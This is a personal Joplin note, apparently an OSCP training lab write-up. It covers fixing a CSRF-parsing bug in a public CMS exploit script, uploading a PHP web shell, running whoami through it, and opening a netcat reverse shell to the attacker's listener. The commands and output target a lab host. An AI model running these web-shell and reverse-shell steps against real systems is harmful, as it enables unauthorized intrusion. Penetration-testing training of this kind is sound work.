15.2.4.1

# 15.2.4.1
## 15.2.4.1.1. Observe the error that is generated when running the exploit.
Here is the error
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ python 44976_modified.py 
/home/kali/.local/lib/python2.7/site-packages/urllib3/connectionpool.py:988: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.214.44'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning,
[+] Authenticated successfully with the supplied credentials
Traceback (most recent call last):
  File "44976_modified.py", line 103, in <module>
    run()
  File "44976_modified.py", line 94, in run
    cookies,csrf_token = authenticate()
  File "44976_modified.py", line 38, in authenticate
    return response.cookies, parse_csrf_token(response.headers['Location'])
  File "44976_modified.py", line 24, in parse_csrf_token
    return location.split(csrf_param + "=")[1]
IndexError: list index out of range
```


## 15.2.4.1.2. Attempt to troubleshoot the code and determine why the error occurs.

Add a print statement to see what is passed to the parse_csrf_token function. Here is the output:
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ python 44976_modified.py 
...
[+] String that is being split: https://192.168.214.44/admin?_sk_=d2ea2feb7eb09c65a41
...
```



## 15.2.4.1.3. Modify the exploit in order to avoid the error and run it against your dedicated Linux client.
Change the csrf_param variable
![379168bbe78d966fc5ec74ec04b07f05.png](:/0c891b8faf4f47babe292721e1a2d74f)




## 15.2.4.1.4. Verify that your exploit worked by attempting to execute the *whoami* command using the remote php shell.

Run the exploit:
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ python 44976_modified.py 
/home/kali/.local/lib/python2.7/site-packages/urllib3/connectionpool.py:988: InsecureRequestWarning: Unverified HTTPS request is being made to host '192.168.214.44'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings
  InsecureRequestWarning,
[+] Authenticated successfully with the supplied credentials
[*] Attempting to upload cmsmsrce.txt...
...
[+] Successfully uploaded cmsmsrce.txt
[*] Attempting to copy cmsmsrce.txt to shell.php...
...
[+] File copied successfully
[+] Exploit succeeded, shell can be found at: https://192.168.214.44/uploads/shell.php
```

Validate the exploit by attaching to the php shell with curl
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ curl -k https://192.168.214.44/uploads/shell.php?cmd=whoami
www-data
```


## 15.2.4.1.5. Attempt to obtain a fully interactive shell with this exploit.

Open a netcat listener on Kali
```plaintext
kali@kali:~$ sudo nc -lnvp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
```

Run a netcat cmd on the exploit to connect to our Kali machine.
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/15_fixingExploits/cms$ curl -k https://192.168.214.44/uploads/shell.php?cmd=nc+-nv+192.168.119.214+4444+-e+/bin/bash
```

Notice we have a shell
![34f36b8c720d6bd92a09001c071088c0.png](:/24fc596d96c24d6cbc601301dda13123)









id: e5187928193349879fd3296e1984fedf
parent_id: 56907e58a0944c6396f404c03d639f7e
created_time: 2020-09-26T18:16:00.323Z
updated_time: 2020-09-29T00:27:21.748Z
is_conflict: 0
latitude: 0.00000000
longitude: 0.00000000
altitude: 0.0000
author: 
source_url: 
is_todo: 0
todo_due: 0
todo_completed: 0
source: joplin-desktop
source_application: net.cozic.joplin-desktop
application_data: 
order: 0
user_created_time: 2020-09-26T18:16:00.323Z
user_updated_time: 2020-09-29T00:27:21.748Z
encryption_cipher_text: 
encryption_applied: 0
markup_language: 1
is_shared: 0
type_: 1